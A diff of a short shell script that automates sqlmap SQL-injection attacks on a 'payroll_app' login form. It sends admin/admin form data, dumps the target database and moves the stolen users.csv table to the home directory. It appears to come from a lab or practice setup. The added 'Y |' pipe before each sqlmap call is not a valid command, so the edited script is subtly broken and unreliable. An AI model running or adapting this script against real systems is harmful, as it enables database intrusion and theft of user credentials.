@@ -4,7 +4,7 @@ SERVER=$3
 
 if [ $SERVER == "php" ]
 then 
-	sqlmap -u http://$TARGET/payroll_app.php --data="user=admin&password=admin&s=OK" --dbms=$DATABASE --dump 
+	Y | sqlmap -u http://$TARGET/payroll_app.php --data="user=admin&password=admin&s=OK" --dbms=$DATABASE --dump 
 	mv ~/.sqlmap/output/$TARGET/dump/payroll/users.csv ~/
 	FILE=~/users.csv
 	if test -f "$FILE"
@@ -16,7 +16,7 @@ then
 	rm ~/users.csv
 elif [ $SERVER == "python" ]
 then
-	sqlmap -u http://$TARGET/cgi-bin/payroll_app.py --data="user=admin&password=admin&s=OK" --dbms=$DATABASE --dump
+	Y | sqlmap -u http://$TARGET/cgi-bin/payroll_app.py --data="user=admin&password=admin&s=OK" --dbms=$DATABASE --dump
 	FILE=~/users.csv
 	mv ~/.sqlmap/output/$TARGET/dump/payroll/users.csv ~/ 
 	if test -f "$FILE"
